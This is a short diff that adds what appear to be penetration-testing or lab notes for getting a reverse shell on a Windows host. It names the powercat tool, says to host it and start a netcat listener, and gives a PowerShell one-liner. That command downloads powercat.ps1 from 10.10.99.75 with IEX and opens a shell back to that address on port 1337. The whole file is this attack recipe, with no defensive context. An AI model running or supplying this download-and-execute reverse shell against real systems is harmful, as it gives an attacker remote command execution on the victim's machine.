@@ -1,0 +1,4 @@
+Get powercat : https://github.com/besimorhino/powercat.git
+Host it
+Nc listener
+in cmd:  powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.99.75:8000/powercat.ps1');powercat -c 10.10.99.75 -p 1337 -e cmd"
